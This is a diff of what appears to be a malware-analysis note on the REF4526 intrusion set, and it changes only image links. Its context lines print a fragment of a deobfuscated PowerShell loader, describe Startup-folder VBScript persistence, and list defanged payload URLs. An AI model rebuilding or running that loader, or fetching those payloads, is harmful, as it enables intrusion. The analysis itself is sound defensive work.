@@ -19,17 +19,17 @@ This research focused on the following:
 
 The analysis of the intrusion set describes an obsfuscation method (maybe) intended to evade automated analysis of PowerShell commands
 
-![[/Untitled 540.png|Untitled 540.png]]
+![[Untitled 540.png|Untitled 540.png]]
 
 Execution flow for the REF4526 intrusion set
 
-![[/Untitled 1 6.png|Untitled 1 6.png]]
+![[Untitled 1 6.png|Untitled 1 6.png]]
 
 Trend Micro Vision One Alert
 
-![[/Untitled 2 6.png|Untitled 2 6.png]]
+![[Untitled 2 6.png|Untitled 2 6.png]]
 
-![[/Untitled 3 6.png|Untitled 3 6.png]]
+![[Untitled 3 6.png|Untitled 3 6.png]]
 
 **maintains access by copying itself into the user's Startup folder as a natively-supported VBscript.**
 
@@ -51,7 +51,7 @@ To illustrate what’s happening, I used the data analysis tool created by the G
 
   
 
-![[/Untitled 4 6.png|Untitled 4 6.png]]
+![[Untitled 4 6.png|Untitled 4 6.png]]
 
 The output was:
 
@@ -61,15 +61,15 @@ $RodaCopy = '´²ª·³·³ª³´';[Byte[]] $DLL = [system.Convert]::FromBase64S
 
 There is an IP Address from where the **LOADER** is downloaded. `'hxxp[://]91[.]213[.]50[.]74/GREEN/RXWER/dllf3.txt'`
 
-![[/Untitled 5 5.png|Untitled 5 5.png]]
+![[Untitled 5 5.png|Untitled 5 5.png]]
 
-![[/Untitled 6 4.png|Untitled 6 4.png]]
+![[Untitled 6 4.png|Untitled 6 4.png]]
 
 And also a reversed URL. `'hxxps[://]pasteio[.]com/download/xxxwsP9yoAsG'`
 
-![[/Untitled 7 4.png|Untitled 7 4.png]]
+![[Untitled 7 4.png|Untitled 7 4.png]]
 
-![[/Untitled 8 4.png|Untitled 8 4.png]]
+![[Untitled 8 4.png|Untitled 8 4.png]]
 
   
 
@@ -77,7 +77,7 @@ And also a reversed URL. `'hxxps[://]pasteio[.]com/download/xxxwsP9yoAsG'`
     
     Downloading the **dllf3.txt** from the source provides me another Base64-encoded string.
     
-    ![[/Untitled 9 4.png|Untitled 9 4.png]]
+    ![[Untitled 9 4.png|Untitled 9 4.png]]
     
       
     
